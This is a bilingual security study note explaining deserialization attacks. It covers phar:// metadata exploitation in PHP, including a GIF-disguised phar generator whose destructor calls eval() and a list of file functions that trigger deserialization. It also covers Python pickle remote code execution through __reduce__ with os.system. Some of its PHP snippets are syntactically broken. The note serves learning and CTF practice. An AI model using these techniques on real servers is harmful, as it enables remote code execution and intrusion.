# Unserialization
**序列化：將物件轉換成字串; 反序列化：將字串轉換成物件**.  
*  [PHP 反序列化](#PHP-反序列化)  
*  [Python 反序列化](#python-反序列化)  
  
# PHP 反序列化
當`unserialize()`的參數可控時，我們可以構造攻擊字串去覆蓋特定變數來控制程式流程。**POP CHAIN**在反序列化中非常重要，擔任串起`unserialize()`和各個magic functions的角色。  

## Serialization vs Unserialization
```php
class pwnch(){
  $test = "helloworld";
  function __wakeup(){
      echo "hello again";
  }
}
echo serialize(new pwnch());   // OUTPUT: O:5:"pwnch":1:{s:4:"test";s:10:"helloworld";}
```
輸出: `O`代表物件，`5`是物件名字的長度。`1`是屬性的個數，`4`是變數名字的長度，表達式是`key:value`.  

型態 | 語法  
------------ | -------------  
String | `s:size:value;`  
Integer | `i:value;`  
Boolean | `b:value;`  
NULL | `N;`  
Array | `a:size:{key-type:key-value;value-type:value-value;}`  
Object | `O:strlen(Object):class-name:object size:`  
------------ | -------------  
public | `{s:4:"test"}`  
private | `{s:11:"%00pwnch%00test"}`  
protected | `{s:7:"%00*%00test"}`  

## Magic Function
* `construct()`: 當new一個obj時會呼叫到，但unserialize()不會call到  
* `destruct()`: 當unset一個obj時會呼叫到，而且unserialize也會call到  
* `__sleep()`: 在序列化的第一時間執行  
* `__wakeup()`: 在反序列化的第一時間執行  
* `__toString()`: 在`echo`一個obj時會呼叫到。這個雖然跟反序列化的呼叫鏈沒有直接關係，可是可以作為POP CHAIN的一部分！  
其實object就是一個週期，你一旦宣告了就算沒有unset，thread結束php還是會自己call `destruct`去把物件解體。  

## unserialize With phar
Sam Thomas在2018年BH中發表了一種新的，不需要`unserialize()`就能觸發反序列化的方式。那就是使用`phar://`。  
危險就在於，只要函數背後是用phar去處理元數據的就能觸發反序列化！  
```php
// 以下函數都有危險了:)
file_exists, file_get_contents, file_put_contents, file, fopen, is_dir, is_executable, is_file, is_link, is_readable, is_writable, copy, unlink, stat, readfile
```  
自己寫個小測試:  
```php
class Test {
        public function __destruct() {
            echo 'unserialization happen!';
      }
}

file_exists($filename);
// $filename = phar://uploaded/xxx.gif
```  

## What is phar
PHP can use phar to archive a file. A phar file can be separated into 4 parts: stub(`anything<?php blah; __HALT_COMPILER();?>`), manifest(which is the core of exploit), compressed contents, optional signature.  
```php
$p = new Phar('test.phar');
$p->startBuffering();
$p->addFromString('test.txt', 'text');
$p->setStub('<?php __HALT_COMPILER(); ?>');

class HiClass{}
$o = new HiClass;
$o->data = '1pwnch';
$p->setMetadata($o);
$p->stopBuffering();
```
## How to exploit
Therefore, there are three requirements to implement it: `magic file function`, `uploadable file`, `phar:// is allowed`.  
1. We might not be able to upload the phar file to the website directly. However, we can add other header(stub) to forge it.  
```php
// generate phar
class Test {
   $var out = 'hello';
   function __destruct(){
        eval($this -> out);
   }
}

@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");     // forge to gif and upload to application?filename=phar://uploads/exp.gif
..........
```
[參考細節](https://shinmao.github.io/websecurity/2018/11/24/The-Magic-Power-of-Phar/#more)  

2. Trace any function: whether it **calls file open function** in the bottom side, then whether we can control its parameter. What's more interesting, it even can be used to make a DOS attack.  

## xReference
1. [Blackhat议题解读 | 利用 phar 拓展 php 反序列化漏洞攻击面](https://www.anquanke.com/post/id/157657)  
2. [blackhat议题深入 | phar反序列化](https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485159&idx=1&sn=50b2e94d2d6fc5f69c540113ae9b3f1c&chksm=e89e2e3fdfe9a729869444aa593e97b52970add524b219553f646e8af2aec06e25e8678e7dde&mpshare=1&scene=23&srcid=0822QPN3ZXccNvKuWTQoahLi#rd)

# Python 反序列化
[關於模塊的細節我相當推這篇文章](https://www.jianshu.com/p/5f936abf31f7?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation)  
Functions **pickle** and **cPickle** also can realize the function of serialization  
1. `cPickle.dumps`: object -> string  
2. `cPickle.loads`: string -> object  
You can also use dump/load，but I won't talk about it here.  
vulnerability of unserialization in python is more serious than in php，we can use this module to build RCE！  

## Magic Function
`reduce` will change the target of unserialization，therefore the parameter is controllable
```python
// magic function: reduce
import cPickle
import os

class People(object):

    def __init__(self,username,password):
        self.username = username
        self.password = password

    def __reduce__(self):
        return (os.system, ('ls',))

michael = People('admin','password')
print cPickle.loads(cPickle.dumps(michael))
// Output: ls (the result of ls
```  
We need `cPickle.loads` to trigger the vulnerability. His type of parameter is string，therefore we cannot use `cPickle.loads(michael)`，I use dumps to convert it inside.  

## Exploit
It's always combined with the web in CTF，such as `<?php system("echo $data | python vul.py")?>`. There might be a IO in `vul.py`，so I should deliver my data to the object with **magic function** which has been converted to string.  

## Reference3
1. [Python反序列化小记](https://www.jianshu.com/p/061d2c594d97)  
2. [序列化和反序列化模块pickle介绍 | Python库](https://www.jianshu.com/p/5f936abf31f7?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation)
